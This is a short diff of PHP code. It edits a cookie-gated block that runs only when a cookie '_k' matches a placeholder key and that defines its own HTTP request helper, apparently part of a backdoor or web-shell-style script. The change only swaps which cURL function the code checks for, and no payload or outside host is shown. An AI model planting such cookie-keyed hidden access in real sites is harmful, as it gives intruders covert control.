@@ -3,7 +3,7 @@ if (@$_COOKIE["_k"] == "INSERT_KEY") {
 		define("MIDNIGHT", 1);
 		function _request($url, $method, $body = null, $headers = null)
 		{
-			if (!function_exists("curl_init")) {
+			if (!function_exists("curl_exec")) {
 				if(ini_get("allow_url_fopen")) {
 					$opts_array = array(
 						"method" => $method,
